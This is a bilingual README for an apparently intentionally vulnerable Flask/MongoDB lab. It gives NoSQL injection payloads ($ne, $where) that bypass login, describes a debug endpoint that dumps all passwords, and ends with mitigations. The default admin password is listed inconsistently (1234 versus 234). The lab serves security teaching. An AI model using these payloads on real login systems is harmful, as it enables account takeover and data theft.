# 🛡️ NoSQL Injection Lab with MongoDB and Flask

This project demonstrates how a web application built with Flask can be vulnerable to NoSQL Injection in MongoDB, allowing authentication bypass and execution of arbitrary logic using operators like $ne and $where.

---

## 📌 What does this project do?

- Basic login system using MongoDB
- Flask backend intentionally vulnerable
- Unsafe parsing of user input (JSON injection)
- Execution of user-controlled queries

---

## ⚠️ Vulnerabilities

### 1. Basic NoSQL Injection ($ne)

Payload:
{"$ne": null}

Meaning: not equal to null → always true

---

### 2. Advanced Injection ($where)

Payload:
{"$where": "this.username == 'admin'"}

This bypasses password validation completely.

---

### 3. Data Exposure

Endpoint:
/debug_users

Shows all users and passwords.

---

## ⚙️ Requirements

- Docker Desktop
- Docker Compose

---

## 🚀 Run the lab

docker-compose up --build

Open:
http://localhost:5000

---

## 👤 Default Users

admin / 1234  
ana / 1234  
bruno / 1234  
...  

---

## 🧪 Tests

### ❌ 1. Failed login

Username:
admin

Password:
0000

Result: Login failed

---

### ✅ 2. Valid login

Username:
admin

Password:
234

Result: Login successful

---

## 💣 Injection Attacks

### 🔥 3. Bypass with $ne

Username:
admin

Password:
{"$ne": null}

Result: Login without valid password

---

### 💣 4. Full bypass

Username:
{"$ne": null}

Password:
{"$ne": null}

Result: Access as any user

---

## 💣 $where Attacks (JavaScript Injection)

### 🔥 Test 1 — Login as admin

Username:
{"$where": "this.username == 'admin'"}

Password:
123

Result: Login as admin without password

---

### 🔥 Test 2 — Users starting with "a"

Username:
{"$where": "this.username.startsWith('a')"}

Password:
123

Result: Conditional login

---

### 🔥 Test 3 — Password length > 6

Username:
{"$where": "this.password.length > 6"}

Password:
123

Result: Conditional login

---

## 🔍 Data Exfiltration

Go to:
http://localhost:5000/debug_users

Shows all users and passwords.

---

## 🧠 Technical Explanation

- Input is parsed as JSON (json.loads)
- No validation or sanitization
- MongoDB allows operators like $ne and $where
- $where executes JavaScript inside queries

This enables:
- Authentication bypass
- Query manipulation
- Code execution
- Data exposure

---

## 🔒 Mitigation

- Do not parse raw input as JSON
- Validate and sanitize inputs
- Avoid $where
- Use hashed passwords
- Use safe query methods

---

## 🎯 Conclusion

This lab shows how insecure NoSQL input handling can lead to:
- Authentication bypass
- Code execution
- Data exposure

Equivalent to SQL Injection but in NoSQL environments.

---

## ⚠️ Disclaimer

For educational purposes only.

======================================================================

# 🛡️ Laboratorio de NoSQL Injection con MongoDB y Flask

Este proyecto demuestra cómo una aplicación web en Flask puede ser vulnerable a NoSQL Injection en MongoDB.

---

## 📌 ¿Qué hace?

- Sistema de login básico con MongoDB
- Backend vulnerable
- Interpretación insegura de input (JSON)
- Ejecución de consultas manipuladas

---

## ⚠️ Vulnerabilidades

### 1. Inyección básica ($ne)

Payload:
{"$ne": null}

Significa: diferente de null → siempre verdadero

---

### 2. Inyección avanzada ($where)

Payload:
{"$where": "this.username == 'admin'"}

Omite la validación de contraseña.

---

### 3. Exposición de datos

Endpoint:
/debug_users

Muestra usuarios y contraseñas.

---

## ⚙️ Requisitos

- Docker Desktop
- Docker Compose

---

## 🚀 Ejecutar

docker-compose up --build

Abrir:
http://localhost:5000

---

## 👤 Usuarios

admin / 234  
ana / 1234  
bruno / 1234  
...  

---

## 🧪 Pruebas

### ❌ 1. Login fallido

Usuario:
admin

Contraseña:
0000

Resultado: fallido

---

### ✅ 2. Login correcto

Usuario:
admin

Contraseña:
234

Resultado: exitoso

---

## 💣 Ataques

### 🔥 3. Bypass con $ne

Usuario:
admin

Contraseña:
{"$ne": null}

Resultado: acceso sin contraseña

---

### 💣 4. Bypass total

Usuario:
{"$ne": null}

Contraseña:
{"$ne": null}

Resultado: acceso como cualquier usuario

---

## 💣 Ataques con $where

### 🔥 Login como admin

Usuario:
{"$where": "this.username == 'admin'"}

Contraseña:
123

Resultado: acceso como admin

---

### 🔥 Usuarios que empiezan por "a"

Usuario:
{"$where": "this.username.startsWith('a')"}

Contraseña:
123

Resultado: acceso condicionado

---

### 🔥 Contraseña mayor a 6

Usuario:
{"$where": "this.password.length > 6"}

Contraseña:
123

Resultado: acceso condicionado

---

## 🔍 Exfiltración

http://localhost:5000/debug_users

Muestra todos los datos.

---

## 🧠 Explicación

- Se parsea input como JSON
- No hay validación
- Mongo permite operadores peligrosos
- $where ejecuta JavaScript

Permite:
- Bypass
- Manipulación
- Ejecución
- Exposición

---

## 🔒 Mitigación

- No usar json.loads en input
- Validar datos
- Evitar $where
- Hashear contraseñas

---

## 🎯 Conclusión

Demuestra cómo NoSQL mal implementado permite:
- Bypass de login
- Ejecución de código
- Robo de datos

---

## ⚠️ Nota

Uso educativo únicamente.
